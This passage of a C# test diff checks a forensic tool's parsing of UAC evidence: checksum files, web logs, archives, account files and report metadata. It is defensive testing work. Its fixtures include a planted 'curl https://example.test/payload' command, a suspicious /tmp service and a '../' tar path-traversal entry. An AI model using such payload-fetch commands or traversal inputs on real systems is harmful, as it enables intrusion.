+                    "\\" + sha256C + "  /opt/weird\\\\name\\nscript\r\n" +
+                    sha256D + "  *leading-star-name\r\n" +
+                    new string('1', 40) + "  /wrong-algorithm\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(processDir,
+                    "hash_running_processes.md5"),
+                    md5A + " */usr/sbin/sshd\r\n" +
+                    "MD5 (/opt/agent with spaces) = " + md5B + "\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(processDir,
+                    "hash_running_processes.sha1"),
+                    "SHA1(/bin/zsh)= " + sha1A + "\r\n",
+                    new UTF8Encoding(false));
+
+                string before = EvidenceManifest.ComputeSha256(executableHashes);
+                CaseData c = CaseManager.LoadCaseFromFolder(dir);
+                if (c == null || c.UacEvidence == null ||
+                    !c.UacEvidence.IsUac)
+                    throw new InvalidOperationException(
+                        "UAC hash evidence was not detected.");
+
+                string csvPath = CaseManager.ResolveArtifactPath(c,
+                    ArtifactNames.UacFileHashesCsv);
+                if (string.IsNullOrEmpty(csvPath) || !File.Exists(csvPath))
+                    throw new InvalidOperationException(
+                        "UAC file-hash canonical CSV was not created.");
+                if (File.Exists(Path.Combine(dir,
+                    ArtifactNames.UacFileHashesCsv)))
+                    throw new InvalidOperationException(
+                        "Canonical UAC file hashes were written into the evidence root.");
+                if (!string.Equals(before,
+                    EvidenceManifest.ComputeSha256(executableHashes),
+                    StringComparison.OrdinalIgnoreCase))
+                    throw new InvalidOperationException(
+                        "UAC hash source changed during analysis.");
+
+                List<Dictionary<string, string>> rows =
+                    CorrelationCsvHelper.ReadCsv(csvPath);
+                if (rows.Count != 7)
+                    throw new InvalidOperationException(
+                        "Unexpected UAC file-hash row count: " +
+                        rows.Count.ToString(CultureInfo.InvariantCulture));
+
+                Dictionary<string, string> bash = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "Path"),
+                        "/usr/bin/bash", StringComparison.Ordinal));
+                if (bash == null ||
+                    !string.Equals(CorrelationCsvHelper.Get(bash, "Hash"),
+                        sha256A.ToLowerInvariant(), StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(bash, "SourceKind"),
+                        "executable-inventory", StringComparison.Ordinal))
+                    throw new InvalidOperationException(
+                        "GNU checksum output was not normalized.");
+
+                Dictionary<string, string> bsd = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "Path"),
+                        "/Applications/Evil Tool", StringComparison.Ordinal));
+                if (bsd == null ||
+                    !string.Equals(CorrelationCsvHelper.Get(bsd, "InputFormat"),
+                        "named-digest", StringComparison.Ordinal))
+                    throw new InvalidOperationException(
+                        "BSD/OpenSSL digest output was not normalized.");
+
+                Dictionary<string, string> escaped = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "Hash"),
+                        sha256C, StringComparison.Ordinal));
+                if (escaped == null ||
+                    CorrelationCsvHelper.Get(escaped, "Path").IndexOf(
+                        "\\n", StringComparison.Ordinal) < 0 ||
+                    CorrelationCsvHelper.Get(escaped, "Path").IndexOf(
+                        "\\\\", StringComparison.Ordinal) >= 0)
+                    throw new InvalidOperationException(
+                        "Escaped checksum path did not remain single-row safe.");
+                if (!rows.Any(x => string.Equals(
+                    CorrelationCsvHelper.Get(x, "Hash"), sha256D,
+                    StringComparison.Ordinal) && string.Equals(
+                    CorrelationCsvHelper.Get(x, "Path"),
+                    "*leading-star-name", StringComparison.Ordinal)))
+                    throw new InvalidOperationException(
+                        "A leading star in a text-mode file name was lost.");
+
+                string evidenceIndexPath = CaseManager.ResolveArtifactPath(c,
+                    ArtifactNames.UacEvidenceIndexCsv);
+                List<Dictionary<string, string>> evidenceRows =
+                    CorrelationCsvHelper.ReadCsv(evidenceIndexPath);
+                List<Dictionary<string, string>> hashSources = evidenceRows
+                    .Where(x => string.Equals(
+                        CorrelationCsvHelper.Get(x, "Category"), "FileHash",
+                        StringComparison.Ordinal))
+                    .ToList();
+                if (hashSources.Count != 3 || hashSources.Any(x =>
+                    !string.Equals(CorrelationCsvHelper.Get(x,
+                        "AnalysisStatus"), "normalized-source",
+                        StringComparison.Ordinal)))
+                    throw new InvalidOperationException(
+                        "UAC hash sources were not indexed as normalized.");
+
+                FactStore store = FactStore.BuildFromCase(c);
+                List<Fact> facts = store.Facts.Where(x =>
+                    x.Source == UacFileHashNormalizer.SourceName).ToList();
+                if (facts.Count != 7)
+                    throw new InvalidOperationException(
+                        "Unexpected UAC file-hash fact count.");
+                Fact sshd = facts.FirstOrDefault(x =>
+                    HasEntity(x, "Hash", md5A) &&
+                    HasEntity(x, "Path", "/usr/sbin/sshd") &&
+                    HasEntity(x, "HashAlgorithm", "md5"));
+                if (sshd == null || sshd.Time != DateTime.MinValue ||
+                    sshd.TimeKind != FactTimeMetadata.UnknownTimeKind ||
+                    !sshd.FallbackUsed ||
+                    sshd.CollectionStep != "Execution Artifacts" ||
+                    sshd.CollectionStatus != "imported" ||
+                    sshd.ParseLevel != FactProvenanceMetadata.StructuredParseLevel ||
+                    sshd.ParserNote.IndexOf("does not imply maliciousness",
+                        StringComparison.OrdinalIgnoreCase) < 0)
+                    throw new InvalidOperationException(
+                        "UAC file-hash fact semantics were not preserved.");
+                if (!c.LoadWarnings.Any(x => x.IndexOf(
+                    "unsupported, mismatched, or oversized line",
+                    StringComparison.OrdinalIgnoreCase) >= 0))
+                    throw new InvalidOperationException(
+                        "Malformed UAC hash lines were not surfaced.");
+                return true;
+            }
+            catch (Exception ex)
+            {
+                throw new InvalidOperationException(
+                    "UAC file-hash integration test failed: " +
+                    (ex.Message ?? ""), ex);
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool AnalyzeFolder_uac_web_logs_parse_access_error_gzip_and_time_semantics()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_web_" +
+                Guid.NewGuid().ToString("N"));
+            try
+            {
+                string apache = Path.Combine(dir, "[root]", "var", "log",
+                    "apache2");
+                string nginx = Path.Combine(dir, "[root]", "var", "log",
+                    "nginx");
+                Directory.CreateDirectory(apache);
+                Directory.CreateDirectory(nginx);
+                File.WriteAllText(Path.Combine(dir, "uac.log"),
+                    "2026-07-28 10:00:00 +0800 INF Unix-like Artifacts Collector\r\n" +
+                    "2026-07-28 10:00:00 +0800 INF Operating system: linux\r\n" +
+                    "2026-07-28 10:00:00 +0800 INF Hostname: UAC-WEB-01\r\n",
+                    new UTF8Encoding(false));
+
+                File.WriteAllText(Path.Combine(apache, "access.log"),
+                    "203.0.113.10 - alice [28/Jul/2026:10:15:30 +0800] \"POST /upload?x=1 HTTP/1.1\" 201 512 \"https://ref.example/\" \"curl/8.0\"\r\n" +
+                    "example.test:443 2001:db8::10 - bob [28/Jul/2026:02:16:00 +0000] \"GET /admin HTTP/2.0\" 403 123 \"-\" \"Mozilla/5.0\"\r\n" +
+                    "192.0.2.1 - - [28/Jul/2026:02:16:30 +0000] \"GET /long HTTP/1.1\" 200 4 \"-\" \"" +
+                    new string('u', 5000) + "\"\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(apache, "error.log"),
+                    "[Mon Jul 28 10:16:01.123456 2026] [core:error] [pid 4321:tid 99] [client 203.0.113.11:54321] AH00124: Request exceeded limit\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(apache, "access.log.bad"),
+                    "custom-json-format-without-supported-envelope\r\n",
+                    new UTF8Encoding(false));
+
+                using (var compressedFile = new FileStream(
+                    Path.Combine(nginx, "access.log.1.gz"), FileMode.Create,
+                    FileAccess.Write, FileShare.None))
+                using (var compressed = new GZipStream(compressedFile,
+                    CompressionMode.Compress))
+                using (var writer = new StreamWriter(compressed,
+                    new UTF8Encoding(false)))
+                {
+                    writer.WriteLine("198.51.100.5 - - [28/Jul/2026:02:17:00 +0000] \"GET /health HTTP/1.1\" 200 2 \"-\" \"monitor/1.0\"");
+                }
+                File.WriteAllText(Path.Combine(nginx, "error.log"),
+                    "2026/07/28 10:17:01 [error] 123#123: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 198.51.100.6, server: api.example, request: \"GET /api HTTP/1.1\", upstream: \"http://127.0.0.1:8080/api\", host: \"api.example\"\r\n",
+                    new UTF8Encoding(false));
+
+                CaseData c = CaseManager.LoadCaseFromFolder(dir);
+                if (c == null || c.UacEvidence == null || !c.UacEvidence.IsUac)
+                    throw new InvalidOperationException("UAC web evidence was not detected.");
+
+                string csvPath = CaseManager.ResolveArtifactPath(c,
+                    ArtifactNames.UacWebServerEventsCsv);
+                if (!File.Exists(csvPath))
+                    throw new InvalidOperationException("UAC web canonical CSV was not created.");
+                List<Dictionary<string, string>> rows =
+                    CorrelationCsvHelper.ReadCsv(csvPath);
+                if (rows.Count != 6)
+                    throw new InvalidOperationException("Unexpected UAC web row count: " +
+                        rows.Count.ToString(CultureInfo.InvariantCulture));
+
+                Dictionary<string, string> access = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "RequestTarget"),
+                        "/upload?x=1", StringComparison.Ordinal));
+                if (access == null ||
+                    !string.Equals(CorrelationCsvHelper.Get(access, "TimeUtc"),
+                        "2026-07-28T02:15:30.0000000Z", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(access, "RemoteAddress"),
+                        "203.0.113.10", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(access, "Method"),
+                        "POST", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(access, "StatusCode"),
+                        "201", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(access, "User"),
+                        "alice", StringComparison.Ordinal))
+                    throw new InvalidOperationException("Apache combined access fields were not normalized.");
+
+                Dictionary<string, string> vhost = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "VirtualHost"),
+                        "example.test:443", StringComparison.Ordinal));
+                if (vhost == null ||
+                    !string.Equals(CorrelationCsvHelper.Get(vhost, "RemoteAddress"),
+                        "2001:db8::10", StringComparison.Ordinal) ||
+                    !string.IsNullOrEmpty(CorrelationCsvHelper.Get(vhost,
+                        "RemotePort")))
+                    throw new InvalidOperationException("Vhost/IPv6 access fields were not preserved.");
+
+                Dictionary<string, string> longAgent = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "RequestTarget"),
+                        "/long", StringComparison.Ordinal));
+                if (longAgent == null ||
+                    CorrelationCsvHelper.Get(longAgent, "UserAgent").Length != 4096 ||
+                    CorrelationCsvHelper.Get(longAgent, "Details").IndexOf(
+                        "canonical_field_truncated=true", StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Long web headers were not bounded with provenance.");
+
+                Dictionary<string, string> apacheError = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "ProcessId"),
+                        "4321", StringComparison.Ordinal));
+                if (apacheError == null ||
+                    !string.IsNullOrEmpty(CorrelationCsvHelper.Get(apacheError,
+                        "TimeUtc")) ||
+                    !string.Equals(CorrelationCsvHelper.Get(apacheError,
+                        "TimeParseStatus"), "local-time-no-offset",
+                        StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(apacheError,
+                        "RemoteAddress"), "203.0.113.11",
+                        StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(apacheError,
+                        "RemotePort"), "54321", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(apacheError,
+                        "Severity"), "error", StringComparison.Ordinal))
+                    throw new InvalidOperationException("Apache error fields/time boundary were not preserved.");
+
+                Dictionary<string, string> nginxError = rows.FirstOrDefault(x =>
+                    string.Equals(CorrelationCsvHelper.Get(x, "ProcessId"),
+                        "123", StringComparison.Ordinal));
+                if (nginxError == null ||
+                    !string.Equals(CorrelationCsvHelper.Get(nginxError,
+                        "ServerType"), "nginx", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(nginxError,
+                        "RemoteAddress"), "198.51.100.6",
+                        StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(nginxError,
+                        "VirtualHost"), "api.example", StringComparison.Ordinal) ||
+                    !string.Equals(CorrelationCsvHelper.Get(nginxError,
+                        "RequestTarget"), "/api", StringComparison.Ordinal) ||
+                    !string.IsNullOrEmpty(CorrelationCsvHelper.Get(nginxError,
+                        "TimeUtc")))
+                    throw new InvalidOperationException("Nginx error context was not normalized.");
+
+                string evidenceIndex = File.ReadAllText(CaseManager.ResolveArtifactPath(c,
+                    ArtifactNames.UacEvidenceIndexCsv));
+                string[] evidenceRows = evidenceIndex.Split(new string[] {
+                    "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries);
+                string gzipEvidence = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("access.log.1.gz",
+                        StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(gzipEvidence) ||
+                    gzipEvidence.IndexOf("\"normalized-source\"",
+                        StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Gzip web log was not indexed as normalized.");
+                string invalidEvidence = evidenceRows.FirstOrDefault(x =>
+                    x.IndexOf("access.log.bad",
+                        StringComparison.OrdinalIgnoreCase) >= 0);
+                if (string.IsNullOrEmpty(invalidEvidence) ||
+                    invalidEvidence.IndexOf("\"indexed-raw\"",
+                        StringComparison.Ordinal) < 0)
+                    throw new InvalidOperationException("Unsupported web format was not retained as indexed-raw.");
+
+                FactStore store = FactStore.BuildFromCase(c);
+                List<Fact> webFacts = store.Facts.Where(x =>
+                    x.Source == UacWebServerEventNormalizer.SourceName).ToList();
+                if (webFacts.Count != 6)
+                    throw new InvalidOperationException("Unexpected UAC web fact count.");
+                Fact accessFact = webFacts.FirstOrDefault(x =>
+                    HasEntity(x, "RemoteIP", "203.0.113.10") &&
+                    HasEntity(x, "HttpMethod", "POST") &&
+                    HasEntity(x, "RequestTarget", "/upload?x=1") &&
+                    HasEntity(x, "HttpStatus", "201"));
+                if (accessFact == null ||
+                    accessFact.Action != "HttpRequestObserved" ||
+                    accessFact.TimeKind != FactTimeMetadata.EventTimeKind ||
+                    accessFact.ParserNote.IndexOf("proxy",
+                        StringComparison.OrdinalIgnoreCase) < 0)
+                    throw new InvalidOperationException("Web access fact entities were not emitted.");
+
+                Fact errorFact = webFacts.FirstOrDefault(x =>
+                    x.Action == "WebServerErrorMessageObserved" &&
+                    HasEntity(x, "ProcessId", "123"));
+                if (errorFact == null || errorFact.Time != DateTime.MinValue ||
+                    !errorFact.FallbackUsed)
+                    throw new InvalidOperationException("Offset-less web error invented timeline time.");
+                return true;
+            }
+            catch (Exception ex)
+            {
+                throw new InvalidOperationException("UAC web integration test failed: " +
+                    (ex.Message ?? ""), ex);
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool AnalyzeArchive_uac_tar_gz_ingests_complete_evidence()
+        {
+            string work = Path.Combine(Path.GetTempPath(), "ircol_uac_archive_" + Guid.NewGuid().ToString("N"));
+            string source = Path.Combine(work, "source");
+            string archive = Path.Combine(work, "uac-complete.tar.gz");
+            string extractedCache = null;
+            try
+            {
+                string top = Path.Combine(source, "uac-complete");
+                Directory.CreateDirectory(Path.Combine(top, "live_response", "process"));
+                Directory.CreateDirectory(Path.Combine(top, "live_response", "network"));
+                Directory.CreateDirectory(Path.Combine(top, "live_response", "packages"));
+                Directory.CreateDirectory(Path.Combine(top, "[root]", "var", "log"));
+                Directory.CreateDirectory(Path.Combine(top, "[root]", "var", "log", "nginx"));
+                Directory.CreateDirectory(Path.Combine(top, "[root]", "var", "lib", "example"));
+                Directory.CreateDirectory(Path.Combine(top, "[root]", "etc", "systemd", "system"));
+                Directory.CreateDirectory(Path.Combine(top, "[root]", "home", "alice"));
+
+                File.WriteAllText(Path.Combine(top, "uac.log"),
+                    "2026-07-27 01:00:00 +0800 INF UAC version: 3.2.0\r\n" +
+                    "2026-07-27 01:00:00 +0800 INF Operating system: linux\r\n" +
+                    "2026-07-27 01:00:00 +0800 INF System architecture: x86_64\r\n" +
+                    "2026-07-27 01:00:00 +0800 INF Hostname: UAC-ARCHIVE-01\r\n" +
+                    "2026-07-27 01:00:00 +0800 INF Profile: ir_triage\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(top, "live_response", "process", "ps_-eo_pid_user_etime_args.txt"),
+                    "2026-07-27 01:00:00\r\nPID USER ELAPSED COMMAND\r\n1 root 01:00 /sbin/init\r\n4242 alice 00:05 /usr/bin/curl https://example.test\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(top, "live_response", "network", "ss_-tulpen.txt"),
+                    "2026-07-27 01:00:00\r\nNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\r\n" +
+                    "tcp ESTAB 0 0 10.0.0.5:4444 203.0.113.77:443 users:((\"curl\",pid=4242,fd=5))\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(top, "live_response", "packages", "dpkg_-l.txt"),
+                    "||/ Name Version Architecture Description\r\n" +
+                    "ii  curl 8.10.1-1 amd64 command line transfer tool\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(top, "[root]", "var", "log", "auth.log"),
+                    "Jul 27 00:59:00 uac-host sshd[777]: Accepted publickey for alice from 203.0.113.77 port 55222 ssh2\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(top, "[root]", "var", "log", "nginx", "access.log"),
+                    "203.0.113.77 - alice [27/Jul/2026:00:59:30 +0800] \"GET /payload HTTP/1.1\" 200 42 \"-\" \"curl/8.10.1\"\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(top, "[root]", "etc", "passwd"),
+                    "root:x:0:0:root:/root:/bin/bash\r\nalice:x:1000:1000:Alice:/home/alice:/bin/bash\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(top, "[root]", "etc", "group"),
+                    "root:x:0:\r\nalice:x:1000:alice\r\nsudo:x:27:alice\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(top, "[root]", "etc", "shadow"),
+                    "root:!:20000:0:99999:7:::\r\nalice:$6$redacted-hash:20000:0:99999:7:::\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(top, "[root]", "home", "alice", ".bash_history"),
+                    "#1785085200\r\ncurl https://example.test/payload\r\nwhoami\r\n",
+                    new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(top, "[root]", "etc", "systemd", "system", "update-agent.service"),
+                    "[Service]\nExecStart=/tmp/update-agent\n",
+                    new UTF8Encoding(false));
+                File.WriteAllBytes(Path.Combine(top, "[root]", "var", "lib", "example", "state.db"),
+                    new byte[] { 0x00, 0x01, 0x02, 0x03 });
+                File.WriteAllText(Path.Combine(top, ArtifactNames.UacAccountsCsv),
+                    "RecordType,Name,Id,PrimaryGroupId,Home,Shell,Members,PasswordState,Description,SourcePath\r\n" +
+                    "User,forged-archive-user,0,0,/root,/bin/sh,,set,forged,forged.csv\r\n",
+                    new UTF8Encoding(false));
+
+                Directory.CreateDirectory(work);
+                WriteTarGzFromFolder(source, archive);
+
+                CaseData c = CaseManager.LoadCaseFromPath(archive);
+                if (c == null) return false;
+                extractedCache = c.CachePath;
+                if (!string.Equals(c.SourceFormat, "tar.gz", StringComparison.Ordinal)) return false;
+                if (string.IsNullOrWhiteSpace(c.SourceEvidenceSha256) || c.SourceEvidenceSha256.Length != 64) return false;
+                if (c.UacEvidence == null || !c.UacEvidence.IsUac) return false;
+                if (!string.Equals(c.UacEvidence.Version, "3.2.0", StringComparison.Ordinal)) return false;
+                if (c.UacEvidence.RawOnlyCount < 1 || c.UacEvidence.ParserEligibleCount < 3)
+                    throw new InvalidOperationException("Unexpected UAC intake coverage counters: raw=" + c.UacEvidence.RawOnlyCount + ", eligible=" + c.UacEvidence.ParserEligibleCount + ".");
+                if (!string.Equals(c.Hostname, "UAC-ARCHIVE-01", StringComparison.Ordinal)) return false;
+                if (c.EvidenceFiles == null || c.EvidenceFiles.Count < 9) return false;
+                string evidenceIndexPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacEvidenceIndexCsv);
+                string accountsPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacAccountsCsv);
+                if (!File.Exists(evidenceIndexPath)) return false;
+                if (!File.Exists(accountsPath)) return false;
+                if (!File.Exists(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacShellHistoryCsv))) return false;
+                if (!File.Exists(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacPersistenceCsv))) return false;
+                if (!File.Exists(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacPackagesCsv))) return false;
+                if (!File.Exists(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacWebServerEventsCsv))) return false;
+                string accountsCsv = File.ReadAllText(accountsPath);
+                if (accountsCsv.IndexOf("redacted-hash", StringComparison.Ordinal) >= 0 ||
+                    accountsCsv.IndexOf("forged-archive-user", StringComparison.Ordinal) >= 0)
+                    return false;
+                if (c.Artifacts == null || !c.Artifacts.Keys.Any(x => x.EndsWith("update-agent.service", StringComparison.OrdinalIgnoreCase))) return false;
+                if (!c.Artifacts.Keys.Any(x => string.Equals(Path.GetFileName(x), ArtifactNames.UacArchiveEntriesCsv, StringComparison.OrdinalIgnoreCase))) return false;
+
+                FactStore store = FactStore.BuildFromCase(c);
+                c.FactStore = store;
+                if (store == null || store.Facts == null) return false;
+                if (!store.Facts.Any(x => x.Source == UacEvidenceIndexNormalizer.SourceName && HasEntity(x, "Hash", c.EvidenceFiles[0].Sha256))) return false;
+                if (!store.Facts.Any(x => x.Source == UacAccountNormalizer.SourceName && HasEntity(x, "User", "alice"))) return false;
+                Fact shell = store.Facts.FirstOrDefault(x => x.Source == UacShellHistoryNormalizer.SourceName &&
+                    HasEntity(x, "CommandLine", "curl https://example.test/payload"));
+                if (shell == null || shell.Time.Year < 2026) return false;
+                if (!store.Facts.Any(x => x.Source == UacAuthEventNormalizer.SourceName && HasEntity(x, "RemoteIP", "203.0.113.77"))) return false;
+                if (!store.Facts.Any(x => x.Source == UacNetworkConnectionNormalizer.SourceName && HasEntity(x, "ProcessName", "curl"))) return false;
+                if (!store.Facts.Any(x => x.Source == UacPersistenceNormalizer.SourceName &&
+                    HasEntity(x, "ServiceName", "update-agent.service") &&
+                    HasEntity(x, "Path", "/tmp/update-agent"))) return false;
+                if (!store.Facts.Any(x => x.Source == UacPackageNormalizer.SourceName &&
+                    HasEntity(x, "ProductName", "curl") &&
+                    HasEntity(x, "ProductVersion", "8.10.1-1"))) return false;
+                if (!store.Facts.Any(x => x.Source == UacWebServerEventNormalizer.SourceName &&
+                    HasEntity(x, "RemoteIP", "203.0.113.77") &&
+                    HasEntity(x, "RequestTarget", "/payload"))) return false;
+
+                SummaryPayload summary = AnalysisCli.BuildHeadlessSummary(c);
+                string json = SummaryExport.Serialize(summary);
+                string fullLogPath = Path.Combine(work, "uac-full-log.json");
+                FactStorePersistence.ExportFullLogJson(new CaseData[] { c }, fullLogPath);
+                string fullLog = File.ReadAllText(fullLogPath);
+                if (json.IndexOf("\"source_format\":\"tar.gz\"", StringComparison.Ordinal) < 0) throw new InvalidOperationException("summary source_format missing");
+                if (json.IndexOf("\"uac\":", StringComparison.Ordinal) < 0) throw new InvalidOperationException("summary UAC metadata missing");
+                if (json.IndexOf("\"source_evidence_sha256\":", StringComparison.Ordinal) < 0) throw new InvalidOperationException("summary archive hash missing");
+                if (fullLog.IndexOf("\"source_format\":\"tar.gz\"", StringComparison.Ordinal) < 0) throw new InvalidOperationException("full log source_format missing");
+                if (fullLog.IndexOf(UacShellHistoryNormalizer.SourceName, StringComparison.Ordinal) < 0) throw new InvalidOperationException("full log shell facts missing");
+                if (fullLog.IndexOf(UacPersistenceNormalizer.SourceName, StringComparison.Ordinal) < 0) throw new InvalidOperationException("full log persistence facts missing");
+                if (fullLog.IndexOf(UacPackageNormalizer.SourceName, StringComparison.Ordinal) < 0) throw new InvalidOperationException("full log package facts missing");
+                if (fullLog.IndexOf(UacWebServerEventNormalizer.SourceName, StringComparison.Ordinal) < 0) throw new InvalidOperationException("full log web facts missing");
+                if (fullLog.IndexOf(UacEvidenceIndexNormalizer.SourceName, StringComparison.Ordinal) < 0) throw new InvalidOperationException("full log evidence facts missing");
+                return true;
+            }
+            finally
+            {
+                if (!string.IsNullOrEmpty(extractedCache)) TryDeleteDir(extractedCache);
+                TryDeleteDir(work);
+            }
+        }
+
+        private static bool ArchiveIntake_rejects_tar_path_traversal()
+        {
+            string work = Path.Combine(Path.GetTempPath(), "ircol_tar_guard_" + Guid.NewGuid().ToString("N"));
+            string archive = Path.Combine(work, "bad.tar.gz");
+            string destination = Path.Combine(work, "out");
+            try
+            {
+                Directory.CreateDirectory(work);
+                WriteSingleTarGzEntry(archive, "../escaped.txt", Encoding.UTF8.GetBytes("should-not-extract"));
+                bool rejected = false;
+                try { ArchiveIntake.ExtractSafely(archive, destination); }
+                catch (InvalidDataException) { rejected = true; }
+                return rejected && !File.Exists(Path.Combine(work, "escaped.txt"));
+            }
+            catch
+            {
+                return false;
+            }
+            finally
+            {
+                TryDeleteDir(work);
             }
         }
 
@@ -2329,6 +4285,52 @@ namespace IR_Collect.Tests
             }
         }
 
+        private static bool Summary_and_html_include_forensic_policy_metadata()
+        {
+            MainForm form = null;
+            CaseData host = null;
+            try
+            {
+                host = CreateSyntheticCase("HostA");
+                host.CollectionCoverage = new CollectionCoverageReport
+                {
+                    OverallStatus = "partial",
+                    CollectionModeProfile = CollectionModeProfileHelper.ForensicStrict,
+                    OperatorAcknowledgedRisks = true,
+                    OutputTargetClass = CollectionImpactPolicy.OutputSystemDisk,
+                    RestrictedSteps = new List<string> { CollectionImpactPolicy.DeepScanStep },
+                    SkippedByProfile = new List<string> { CollectionImpactPolicy.MemoryAcquisitionStep },
+                    Steps = new List<CollectionCoverageStep>
+                    {
+                        new CollectionCoverageStep
+                        {
+                            Step = CollectionImpactPolicy.MemoryAcquisitionStep,
+                            Status = "skipped",
+                            Detail = "Skipped by ForensicStrict profile.",
+                            ArtifactsPresent = new List<string>(),
+                            ArtifactsMissing = new List<string>()
+                        }
+                    }
+                };
+
+                form = new MainForm();
+                TabPage tab = InvokeCreateSummaryTab(form, host);
+                TextBox box = FindDescendantControl<TextBox>(tab);
+                string text = box != null ? (box.Text ?? "") : "";
+                string html = InvokeBuildHtmlReport(form, host);
+                return text.IndexOf("Output target class: system_disk", StringComparison.OrdinalIgnoreCase) >= 0 &&
+                    text.IndexOf("Operator acknowledged live-response risks: yes", StringComparison.OrdinalIgnoreCase) >= 0 &&
+                    text.IndexOf("Skipped by profile: Memory acquisition", StringComparison.OrdinalIgnoreCase) >= 0 &&
+                    html.IndexOf("<b>Output target class:</b> system_disk", StringComparison.OrdinalIgnoreCase) >= 0 &&
+                    html.IndexOf("<b>Skipped by profile:</b> Memory acquisition", StringComparison.OrdinalIgnoreCase) >= 0;
+            }
+            finally
+            {
+                if (form != null) form.Dispose();
+                if (host != null) TryDeleteDir(host.ExtractPath);
+            }
+        }
+
         private static bool HtmlReport_missing_artifact_counts_render_not_found()
         {
             MainForm form = null;
@@ -2589,6 +4591,10 @@ namespace IR_Collect.Tests
                     OverallStatus = "partial",
                     Host = "HostA",
                     CollectionModeProfile = CollectionModeProfileHelper.ForensicStrict,
+                    OperatorAcknowledgedRisks = true,
+                    OutputTargetClass = CollectionImpactPolicy.OutputSystemDisk,
+                    RestrictedSteps = new List<string> { CollectionImpactPolicy.MemoryAcquisitionStep },
+                    SkippedByProfile = new List<string> { CollectionImpactPolicy.MemoryAcquisitionStep },
                     Steps = new List<CollectionCoverageStep>()
                 };
                 host.FactStoreFreshnessStatus = "current";
@@ -2605,6 +4611,10 @@ namespace IR_Collect.Tests
                     && json.IndexOf("\"memory_acquisition\"", StringComparison.OrdinalIgnoreCase) >= 0
                     && json.IndexOf("\"memory_analysis\"", StringComparison.OrdinalIgnoreCase) >= 0
                     && json.IndexOf("\"collection_coverage_status\":\"partial\"", StringComparison.OrdinalIgnoreCase) >= 0
+                    && json.IndexOf("\"operator_acknowledged_risks\":true", StringComparison.OrdinalIgnoreCase) >= 0
+                    && json.IndexOf("\"output_target_class\":\"system_disk\"", StringComparison.OrdinalIgnoreCase) >= 0
+                    && json.IndexOf("\"restricted_steps\":[\"Memory acquisition\"]", StringComparison.OrdinalIgnoreCase) >= 0
+                    && json.IndexOf("\"skipped_by_profile\":[\"Memory acquisition\"]", StringComparison.OrdinalIgnoreCase) >= 0
                     && json.IndexOf("\"fact_store_freshness_status\":\"current\"", StringComparison.OrdinalIgnoreCase) >= 0
                     && json.IndexOf("Memory handoff:", StringComparison.OrdinalIgnoreCase) >= 0
                     && json.IndexOf("[Reconciled]", StringComparison.OrdinalIgnoreCase) >= 0
@@ -2736,6 +4746,166 @@ namespace IR_Collect.Tests
             }
         }
 
+        private static bool CollectionImpactPolicy_classifies_system_network_and_unknown_targets()
+        {
+            string systemTarget = Path.Combine(Environment.SystemDirectory, "IR_Output_policy_test");
+            return string.Equals(
+                    CollectionImpactPolicy.ClassifyOutputTarget(systemTarget),
+                    CollectionImpactPolicy.OutputSystemDisk,
+                    StringComparison.Ordinal) &&
+                string.Equals(
+                    CollectionImpactPolicy.ClassifyOutputTarget(@"\\server\share\case"),
+                    CollectionImpactPolicy.OutputNetwork,
+                    StringComparison.Ordinal) &&
+                string.Equals(
+                    CollectionImpactPolicy.ClassifyOutputTarget(""),
